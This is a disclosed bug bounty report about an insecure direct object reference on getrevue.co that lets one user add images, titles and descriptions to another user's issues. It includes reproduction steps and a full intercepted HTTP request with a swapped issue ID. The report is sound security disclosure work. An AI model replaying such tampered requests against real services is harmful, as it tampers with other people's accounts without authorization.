# Ability to add arbitrary images/descriptions/titles to ohter people's issues via IDOR on getrevue.co

## Report Details
- **Report ID**: 1096560
- **URL**: https://hackerone.com/reports/1096560
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-02-05T17:50:44.767Z
- **Disclosed**: 2021-05-26T21:56:54.060Z

## Reporter
- **Username**: mirhat
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Summary:** 

Hi team,
I discovered a vulnerability that allows an attacker to add arbitrary images/descriptions/titles to other people's issues via IDOR

**Description:**

It's possible to perform a IDOR attacker on `getrevue.co`when adding a image to your issue it's also possible to add descriptions and more to other people's issue

## Steps To Reproduce:

   1. Go to `getrevue.co` and Sign In
   2. Click on Issues then Click on Add new issue
   3. Go to the Issue that you created and from the bottom of the page Click on Media
   4. Turn on the Intercept and Upload image
   5. On the request change the ID to your other account's issue ID

Request:

```
POST /app/items HTTP/1.1
Host: www.getrevue.co
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://www.getrevue.co/app/issues/current
X-CSRF-Token: qbWPNjfb12c1Plj7WrYDYgQFgWl2IaZr6/Qr/Vf5WyaDGyf68jn1mzx3xwtgFxBBX19RkHs/YHiREA7Ae6PGqg==
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 519
Origin: https://www.getrevue.co
Connection: close
Cookie: [YOUR_COOKIE]

{"item_type":"image","issue":347976,"id":null,"title":"Your account has been hacked","url":"","description":"Your account has been hacked","author":"Your account has been hacked","publication":"Your account has been hacked","section":"Your account has been hacked","image":"https://revue-direct-production.s3.amazonaws.com/cache/30fd80f79ad919f1e310aa97e0ab7940/7dc308f18b70ba627eb954d2d5376bea.png","image_file_name":"","created_at":"","tweet_handle":"","tweet_profile_image":"","tweet_description":"","tweet_lang":""}
```

POC video:

{F1185366}

## Impact

Ability to add arbitrary images/descriptions/titles to other people's issues
It's possible to hijack other people's issues

## Attachments
- Ekran_Kayd__2021-02-05_20.39.45.mov
